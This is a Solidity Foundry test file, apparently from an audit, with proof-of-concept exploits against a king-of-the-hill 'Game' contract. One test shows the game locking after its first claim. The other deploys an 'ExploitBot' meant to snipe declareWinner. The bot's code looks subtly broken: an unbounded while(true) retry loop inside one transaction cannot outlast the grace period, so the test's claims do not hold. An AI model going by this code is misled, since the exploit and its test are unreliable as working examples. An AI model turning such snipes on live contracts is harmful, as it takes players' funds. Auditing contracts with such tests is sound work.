// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Game.sol"; // adjust import if Game.sol is elsewhere

contract GameExploitTest is Test {
    Game public game;
    uint256 public initialFee;

    address public player1 = address(0xAAA1);
    address public player2 = address(0xBEEF);

    function setUp() public {
        // Deploy the Game contract
        game = new Game();

        // Assume initialFee is set based on contract logic
        initialFee = game.claimFee();

        // Fund player1 and player2
        vm.deal(player1, 10 ether);
        vm.deal(player2, 10 ether);
    }

    /// @notice PoC #1 — Game locks after first claim
    function test_GameLocksAfterFirstClaim() public {
        // Player1 claims the throne
        vm.startPrank(player1);
        game.claimThrone{value: initialFee}();
        vm.stopPrank();

        // Simulate a second player trying to claim
        vm.startPrank(player2);
        vm.expectRevert("Game: You are already the king. No need to re-claim.");
        game.claimThrone{value: game.claimFee()}();
        vm.stopPrank();
    }

    /// @notice PoC #2 — ExploitBot can snipe declareWinner
    function test_ExploitBotSnipesDeclareWinner() public {
        // Deploy exploit bot
        ExploitBot bot = new ExploitBot(address(game));

        // Fund bot with enough ETH
        vm.deal(address(bot), 1 ether);

        // Execute exploit
        vm.prank(player1);
        bot.exploit{value: initialFee}();

        // Verify winner was declared by bot
        assertEq(game.currentKing(), address(bot), "ExploitBot did not become king");
        assertEq(game.isGameOver(), true, "Game should be over");
    }
}

/// @notice Exploit contract simulating MEV-like snipe of declareWinner
contract ExploitBot {
    Game public game;

    constructor(address _game) {
        game = Game(_game);
    }

    function exploit() external payable {
        // Claim the throne shortly before grace period expires
        game.claimThrone{value: msg.value}();

        // Loop until grace period is expired and call declareWinner
        while (true) {
            try game.declareWinner() {
                break;
            } catch {}
        }
    }

    receive() external payable {}
}
